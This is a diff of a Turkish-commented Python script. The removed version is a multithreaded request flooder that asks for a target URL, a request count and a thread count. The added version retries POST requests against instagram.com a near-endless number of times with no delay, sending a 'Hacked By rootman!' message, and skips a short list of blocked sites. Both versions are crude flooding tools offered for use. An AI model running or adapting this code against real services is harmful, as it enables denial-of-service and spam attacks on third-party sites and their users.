@@ -1,34 +1,39 @@
-#!/usr/bin/env python3
 import requests
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
 
-def send_request(url, timeout):
-    """
-    Belirtilen URL'ye GET isteği gönderir ve sonuç olarak durum kodunu döner.
-    """
-    try:
-        response = requests.get(url, timeout=timeout)
-        return f"{url} -> Status Code: {response.status_code}"
-    except Exception as e:
-        return f"{url} -> Error: {e}"
+# Kısıtlama listesi (yasaklı siteler)
+BLOCKED_SITES = ["google.com", "doxbin.com"]
 
-def main():
-    # Kullanıcıdan giriş alıyoruz
-    target_url = input("Hedef URL'yi girin: ")
-    num_requests = int(input("Kaç istek göndermek istiyorsunuz? (Önerilen: 100): "))
-    num_threads = int(input("Kaç thread kullanılsın? (Önerilen: 10): "))
-    timeout = float(input("İstek zaman aşımı süresi (saniye)? (Önerilen: 5): "))
+def is_blocked(url):
+    for blocked in BLOCKED_SITES:
+        if blocked in url:
+            print(f"[X] Kısıtlandı: {url} bu tool tarafından erişilemez!")
+            return True
+    return False
 
-    print(f"\nHedef URL: {target_url}")
-    print(f"Toplam {num_requests} istek, {num_threads} thread kullanılarak gönderilecek.\n")
+def send_post_request(url, data, retries=10000000000000, timeout=1):
+    if is_blocked(url):
+        return None  # İstek gönderilmez
+    
+    for attempt in range(retries):
+        try:
+            response = requests.post(url, json=data, timeout=timeout)
+            response.raise_for_status()
+            print(f"[✓] Başarılı! Status Code: {response.status_code}")
+            return response.json()
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Hata: {e} (Deneme {attempt + 1}/{retries})")
+            time.sleep(0 ** attempt)
+            
+    print("[X] Maksimum deneme sayısına ulaşıldı. İstek başarısız oldu.")
+    return None
 
-    with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        # Kullanıcıdan alınan bilgilere göre istekler oluşturuyoruz.
-        futures = [executor.submit(send_request, target_url, timeout) for _ in range(num_requests)]
+# Kullanım
+url = "https://instagram.com/"
+data = {"username": "rootman", "message": "Hacked By rootman!"}
+response = send_post_request(url, data)
 
-        # Görevler tamamlandıkça sonucu yazdırıyoruz.
-        for future in as_completed(futures):
-            print(future.result())
-
-if __name__ == "__main__":
-    main()
+if response:
+    print(f"Yanıt: {response}")
+else:
+    print("İstek başarısız oldu veya site erişime kısıtlandı.")
